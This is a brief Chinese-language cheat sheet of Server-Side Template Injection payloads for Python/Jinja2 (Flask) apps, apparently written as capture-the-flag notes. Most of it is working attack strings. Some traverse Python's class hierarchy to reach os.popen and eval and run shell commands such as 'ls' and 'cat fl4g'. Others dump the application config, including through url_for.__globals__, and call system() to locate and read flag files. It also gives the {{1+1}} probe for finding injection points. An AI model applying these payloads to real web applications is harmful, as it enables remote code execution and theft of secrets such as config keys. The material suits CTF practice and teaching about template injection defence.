# SSTI

* ### 标准SSTI查询语句

```
''.__class__.__base__.__subclasses__() //返回子类列表
''.__class__.__base__.__subclasses__()[30].__init__ //查看第30位子类的init，返回<slot wrapper '__init__' of 'object' objects>则未被重载不存在init
''.__class__.__base__.__subclasses__()[5].__init__.__globals__['__builtins__']['eval']  //执行命令
''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()  //得到ls结果并打印在页面上
''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()
```

* ### SSTI注入

源代码未对config进行过滤时：

```
{{config}} //调出所有app.config中的字段
```

SSTI注入尝试：对于@app.route\('/shrine/'\)，使用

```
/shrine/{{1+1}}
```

进行注入尝试

```
/shrine/{{url_for.__globals__}}   //查看全局
/shrine/{{url_for.__globals__['current_app'].config}}  //查看当前app下的config
```

Payload：

```
{{system('find / -name flag')}}    //查找名为flag的文件
{{system('cat /flag')}}   //获取根目录下名为flag的文件
```



注入点发现：输入时采用{{1+1}}判断是否存在注入点



